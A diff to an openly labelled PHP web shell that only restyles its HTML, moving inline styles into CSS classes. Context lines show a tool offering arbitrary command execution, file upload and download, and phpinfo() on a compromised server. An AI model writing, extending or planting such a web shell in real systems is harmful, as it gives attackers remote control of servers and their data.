@@ -49,13 +49,30 @@
     <head>
         <meta charset="UTF-8" />
         <title>PHP Webshell</title>
+        <style>
+            body {
+                font-family: sans-serif;
+            }
+            input[type=text] {
+                font-family: monospace;
+            }
+            .cmd-box {
+                width: 80%;
+            }
+            .info-line {
+                margin: 3px auto;
+            }
+            .feature-box {
+                margin: 1rem auto;
+            }
+        </style>
     </head>
-    <body style="font-family: sans-serif;">
+    <body>
         <form id="form-cmd" method="POST" action="">
-            <input type="text" id="cmd" name="cmd" placeholder="Enter command, use arrow keys for history" autofocus="autofocus" style="width: 80%;" />
+            <input type="text" id="cmd" name="cmd" placeholder="Enter command, use arrow keys for history" autofocus="autofocus" class="cmd-box" />
             <input type="submit" name="submit-cmd" value="Run" />
         </form>
-        <div style="margin: 3px auto;">
+        <div class="info-line">
 <?php
     if($execute) {
         echo "Output of command: <code>" . htmlspecialchars($_POST["cmd"]) . "</code>\n";
@@ -64,7 +81,7 @@
     }
 ?>
         </div>
-        <textarea readonly="readonly" rows="25" style="width: 80%;">
+        <textarea readonly="readonly" rows="25" class="cmd-box">
 <?php
     if($execute) {
         if(function_exists("exec")) {
@@ -87,7 +104,7 @@
     }
 ?>
         </textarea>
-        <div style="margin: 3px auto;">
+        <div class="info-line">
 <?php
     if(isset($exec_func)) {
         echo "Execution function: <code>" . $exec_func . "</code>";
@@ -97,7 +114,7 @@
     }
 ?>
         </div>
-        <div style="margin: 1rem auto;">
+        <div class="feature-box">
             <b>File Upload</b>
             <div>
 <?php
@@ -108,11 +125,11 @@
             </div>
             <form method="POST" action="" enctype="multipart/form-data">
                 <input type="file" name="upload-files[]" multiple="multiple" />
-                <input type="text" name="upload-dir" placeholder="Destination directory" />
+                <input type="text" name="upload-dir" placeholder="Destination folder" />
                 <input type="submit" name="submit-upload" value="Upload" />
             </form>
         </div>
-        <div style="margin: 1rem auto;">
+        <div class="feature-box">
             <b>File Download</b>
             <div>
 <?php
@@ -126,7 +143,7 @@
                 <input type="submit" name="submit-download" value="Download" />
             </form>
         </div>
-        <div style="margin: 1rem auto;">
+        <div class="feature-box">
             <b>Info</b>
             <form method="POST" action="" target="_blank">
                 <input type="submit" name="submit-phpinfo" value="phpinfo()" />
